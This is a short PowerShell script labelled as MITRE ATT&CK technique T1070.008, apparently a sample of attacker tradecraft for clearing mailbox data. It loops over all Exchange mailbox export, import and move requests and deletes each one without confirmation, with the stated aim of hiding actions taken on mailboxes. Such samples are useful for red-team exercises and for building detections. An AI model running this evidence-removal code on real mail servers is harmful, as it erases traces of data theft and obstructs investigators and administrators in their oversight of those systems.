# T1070.008 - Indicator Removal: Clear Mailbox Data
# Hide actions on mailbox 

#Import the Exchange PowerShell Module
Import-Module Exchange

#Get the list of all Export Requests
$ExportRequests = Get-MailboxExportRequest

#Get the list of all Import Requests
$ImportRequests = Get-MailboxImportRequest

#Get the list of all Move Requests
$MoveRequests = Get-MoveRequest

#Loop through the list of export requests and hide the requests
foreach($ExportRequest in $ExportRequests)
{
 Remove-MailboxExportRequest -Identity $ExportRequest -Confirm:$false
}

#Loop through the list of import requests and hide the requests
foreach($ImportRequest in $ImportRequests)
{
 Remove-MailboxImportRequest -Identity $ImportRequest -Confirm:$false
}

#Loop through the list of move requests and hide the requests
foreach($MoveRequest in $MoveRequests)
{
 Remove-MoveRequest -Identity $MoveRequest -Confirm:$false
}
